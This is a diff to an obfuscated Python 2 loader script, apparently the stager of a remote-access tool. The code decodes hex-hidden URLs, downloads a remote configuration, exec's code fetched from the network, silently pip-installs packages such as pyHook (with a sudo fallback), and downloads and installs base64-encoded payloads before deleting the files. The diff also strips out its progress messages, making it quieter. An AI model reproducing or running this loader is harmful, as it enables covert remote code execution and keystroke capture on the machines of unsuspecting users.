@@ -8,6 +8,7 @@ import base64
 import urllib2
 
 
+
 def run(*args, **kwargs):
     IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
     SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
@@ -15,6 +16,7 @@ def run(*args, **kwargs):
     AccidentalAquaticCactus   = json.loads(urllib2.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
     AccidentalAquaticCactus['settings']['__f__'] = IncontinentObtuseCucumber(__file__) if '__file__' in globals() else ''
     GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
+    os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
     if not len(GroovySophisticatedLemur):
         exec urllib2.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__y__'))).read() in globals()
         exec urllib2.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__x__'))).read() in globals()
@@ -23,13 +25,11 @@ def run(*args, **kwargs):
             for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(struct.calcsize('P') * 8)].items():
                 if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                     try:
-                        print ' '.join([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                         RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                     except Exception as e:
                         print 'Error:', str(e)
                     if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                         try:
-                            print ' '.join(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                             RuthlessSpiffyTablecloth(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                         except Exception as e:
                             print 'Error:', str(e)
@@ -38,17 +38,23 @@ def run(*args, **kwargs):
                                 ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
                             elif 'pypiwin32' in FoamyNonstopHistory:
                                 ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
-                            else:
-                                ZonkedEnthusiasticTadpole = os.path.basename(NobleRusticWalrus)
                             try:
                                 with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
-                                    print 'Downloading {} from {}...'.format(FoamyNonstopHistory, ZonkedEnthusiasticTadpole)
-                                    fp.write(base64.b64decode(urllib2.urlopen(GnarledAutisticEarlobe).read()))
+                                    fp.write(base64.b64decode(urllib2.urlopen(NobleRusticWalrus).read()))
                                 RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                             except Exception as e:
                                 print 'Error:', str(e)
                             if os.path.isfile(os.path.basename(NobleRusticWalrus)):
                                 os.remove(os.path.basename(NobleRusticWalrus))
+                        else:
+                            print FoamyNonstopHistory, 'loaded'
+                            continue
+                    else:
+                        print FoamyNonstopHistory, 'loaded'
+                        continue
+                else:
+                    print FoamyNonstopHistory, 'loaded'
+                    continue
         finally:
             try:
                 RoundPluckyScallion = urllib2.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__w__'))).read()
